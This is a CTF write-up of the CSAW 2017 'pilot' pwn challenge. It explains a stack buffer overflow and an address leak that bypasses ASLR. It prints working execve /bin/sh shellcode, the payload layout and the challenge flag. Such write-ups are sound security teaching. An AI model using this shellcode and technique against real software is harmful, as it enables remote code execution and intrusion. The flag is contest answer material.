### pilot - CSAW CTF 2017 - 75 points - Pwn
**Description - Can I take your order? **
**Files: [pilot](https://github.com/Fauer4Effect/write-ups/blob/master/pilot/pilot)**

*Solved by Fauer4Effect*

***

This is a fairly straightforwards buffer overflow, the only twist is that we need to increase the size of the stack.

From running file on the binary we can see that it's a 64 bit binary. Running the binary gives us a prompt, including a hex value that looks like a memory address, back to this later. Then it prompts us for a command, trying it with just random input and the binary exits.

![pilot prompt](https://github.com/Fauer4Effect/write-ups/blob/master/pilot/prompt.png)

The next thing we do is open it up in Binary Ninja and start looking for anything interesting. Looking at where the user input is received we can see that it will read up to 64 bytes of input but the buffer is only 32 bytes. This looks promising.

![vuln disassembly](https://github.com/Fauer4Effect/write-ups/blob/master/pilot/vuln.png)

ASLR is enabled but luckily the binary is really nice and prints us the address of our buffer.

The shellcode used is standard execve /bin/sh shellcode:

```
xor eax, eax
mov rbx, 0xFF978CD091969DD1
neg rbx
push rbx
push rsp
pop rdi
cdq
push rdx
push rdi
push rsp
pop rsi
mov al, 0x3b
syscall
```

The only real source of difficulty is that this shellcode pushes a lot of stuff to the stack and our buffer is pretty small. This results in the pushed data overwriting the later parts of the shellcode which causes SEGFAULTS.

There's a pretty simple solution to this problem, we'll just make more space.

We'll just add another instruction to the front of our shellcode, `sub rsp, 0x30`

So our exploit is going to look like the following

`sub_rsp + shellcode + nops + buffer_addr`

We can easily pull the buffer address from the prompt, just make sure to remember to pad it out to full length.

And boom shell...

![shell](https://github.com/Fauer4Effect/write-ups/blob/master/pilot/shell.png)

then ls
and cat flag

`flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}`
